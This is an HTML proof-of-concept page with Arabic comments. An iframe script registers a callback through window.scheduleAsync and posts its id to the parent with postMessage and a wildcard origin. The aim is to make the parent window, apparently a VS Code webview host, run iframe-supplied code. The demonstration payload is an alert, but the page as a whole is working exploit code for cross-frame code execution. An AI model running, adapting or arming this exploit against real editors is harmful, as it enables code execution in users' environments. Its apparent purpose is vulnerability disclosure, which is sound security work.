<!DOCTYPE html>
<html>
<head>
  <title>POC</title>
</head>
<body>
  <h1>Loading exploit...</h1>

  <script>
    // 1. تسجيل callback
    let callbackId = null;

    function maliciousAction() {
      // هذا هو الكود الذي سينفذ داخل الـ parent
      alert("🔥 PoC Executed from Iframe (callback triggered)");
    }

    // هل يوجد scheduleAsync؟
    if (window.scheduleAsync) {
      window.scheduleAsync(() => {
        // هذا الكود سينفذ داخل الـ parent window
        maliciousAction();
      }).then(id => {
        callbackId = id;

        // 2. بعد الحصول على ID، نرسل postMessage للـ parent
        parent.postMessage({
          vscodeScheduleAsyncWork: callbackId
        }, "*");
      }).catch(err => {
        console.error("scheduleAsync error:", err);
      });
    } else {
      document.body.innerHTML = "<h2>scheduleAsync not available</h2>";
    }
  </script>
</body>
</html>
